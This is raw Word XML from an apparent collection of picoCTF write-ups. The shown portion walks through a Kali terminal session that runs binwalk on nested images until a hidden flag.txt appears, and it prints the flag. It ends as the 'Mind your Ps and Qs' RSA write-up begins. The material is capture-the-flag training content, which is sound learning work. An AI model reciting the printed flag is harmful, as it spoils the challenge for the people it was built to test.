          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">, uncompressed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383936</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>name:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>base_images/</w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>2_</w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t>c.jpg</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651613</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0x9F15D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> End of Zip archive, footer </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>length:</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22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE54DA7" w14:textId="43E0D53C" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B085BE8"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 cd base_images/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABA9B5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 ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43E70E95" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>2_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12275521"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w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t># binwalk -e 2_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F99527" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46DBBB8E"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76B70DE0" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>--------------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679C3BAA" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>0             0x0             PNG image, 526 x 1106, 8-bit/color RGBA, non-interlaced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA9DB2C"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624A0ED5"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187707        0x2DD3B         Zip archive data, at least v2.0 to extract, compressed size: 196045, uncompressed size: 201447, name: </w:t>
      </w:r>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>base_images/3_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E27F84A" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>383807        0x5DB3F         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6D12D6" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>383918        0x5DBAE         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6978816B" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F09D271"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 ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DB1A75" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>2_c.jpg  _2_c.jpg.extracted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E92D970"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 cd _2_c.jpg.extracted/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BD6F1B"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 cd base_images/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="235C47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2634F01D" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>3_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EC4F57"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 binwalk -e 3_c.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FACAF66" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3ED19A05"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0A0E93FA" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>--------------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C4F8F58" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>0             0x0             PNG image, 428 x 1104, 8-bit/color RGBA, non-interlaced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433B25A5"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4F1FFC63" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>123606        0x1E2D6         Zip archive data, at least v2.0 to extract, compressed size: 77653, uncompressed size: 79808, name: base_images/4_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19224CD1" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>201425        0x312D1         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E9A226" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44FE7CC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720674A6" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>3_c.jpg  _3_c.jpg.extracted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB5FC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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA9EEA0" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>bash: cd: _3: No such file or directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E34623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_3_c.jpg.extracted/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA9B09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 ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE7DF40" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>1E2D6.zip  base_images</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6C9103" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted# cd base_images/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C03F62F"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4F083799" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4_c.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0949D036"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root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted/base_images# binwalk -e 4_c.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FC5631C" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02780B8F"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52600D18" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>--------------------------------------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E328A3" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>0             0x0             PNG image, 320 x 768, 8-bit/color RGBA, non-interlaced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9ADAAB"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11C3A9B7" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>79578         0x136DA         Zip archive data, at least v2.0 to extract, compressed size: 64, uncompressed size: 81, name: flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5291EC" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>79786         0x137AA         End of Zip archive, footer length: 22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB4C64D" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E286152"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1E2A6F9E" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4_c.jpg  _4_c.jpg.extracted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D08B85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cd _4_c.jpg.extracted/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3295E24A"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ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B16F930" w14:textId="77777777" w:rsidR="00E86710" w:rsidRPr="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>136DA.zip  flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B628B2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cat flag.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23614946" w14:textId="0E80C2B7" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="00E86710">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>picoCTF{e3f378fe6c1ea7f6bc5ac2c3d6801c1f}root@kali:~/Downloads/_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted/base_images/_4_c.jpg.extracted#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4983FE" w14:textId="7B0EE33E" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>picoCTF{e3f378fe6c1ea7f6bc5ac2c3d6801c1f}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0530C8A0" w14:textId="3B8D426B" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3539E7BA" w14:textId="097B90C8" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="646E03B3" w14:textId="6B90C8F6" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C7A6487" w14:textId="6E6F5CE4" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37AB9B9A" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Mind your Ps and Qs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7D3C56" w14:textId="77777777" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>by </w:t>
      </w:r>
      <w:hyperlink r:id="rId95" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>xnomas</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> / </w:t>
      </w:r>
      <w:hyperlink r:id="rId96" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>xnomas</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="58807D77"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b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Tags:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="label"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
          <w:shd w:val="clear" w:color="auto" w:fill="3A87AD"/>
        </w:rPr>
        <w:t>easy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="label"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
          <w:shd w:val="clear" w:color="auto" w:fill="3A87AD"/>
        </w:rPr>
        <w:t>rsa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545A3058"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Rating: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="category-value"/>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>5.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FD9250" w14:textId="2A21BCC2" w:rsidR="00786656" w:rsidRDefault="00786656" w:rsidP="00786656">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        <w:spacing w:before="0" w:line="540" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t>Mind your Ps and Qs</w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit"/>
          <w:color w:val="333333"/>
          <w:sz w:val="45"/>
          <w:szCs w:val="45"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
